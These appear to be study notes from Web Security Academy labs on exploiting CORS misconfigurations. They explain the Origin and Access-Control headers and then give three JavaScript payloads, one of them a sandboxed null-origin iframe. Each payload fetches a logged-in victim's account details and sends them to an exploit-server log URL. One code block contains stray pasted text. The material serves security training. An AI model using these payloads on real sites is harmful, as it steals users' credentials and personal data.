Testing for CORS misconfigurations:

1. Change the origin header to an arbitrary value

1. Change the origin header to the null value

1. Change the origin header to one that begins with the origin  
    of the site.

1. Change the origin header to one that ends with the origin of the site

---

**Cross-Origin Resource Sharing (CORS)** is a security mechanism that allows web browsers to make requests to a different domain than the one that served the original web page.

Normally, browsers enforce the "same-origin policy," which blocks requests between different origins (domains) for security reasons. CORS provides a way to relax this restriction in a controlled manner.

**How it works:**

- When a web page makes a cross-origin request, the browser sends an `Origin` header indicating where the request came from

- The server can respond with an `Access-Control-Allow-Origin` header to indicate which origins are allowed to access the resource

- If the response header matches the request's origin, the browser allows the response to be read by the web page

**Example:** If a website at `example.com` makes a request to `api.example.org`, the API server would need to include `Access-Control-Allow-Origin: https://example.com` in its response to allow the browser to share the data with the requesting page.

`Access-Control-Allow-Credentials`

  

```JavaScript
<script>DOM Invader is NOT enabled.
﻿


    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

  

The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:

- Cross-origin redirects.

- jkRequests from serialized data.

- Request using the `file:` protocol.

- Sandboxed cross-origin requests.

  

for null origin

```JavaScript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

  

for different website:

```JavaScript
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```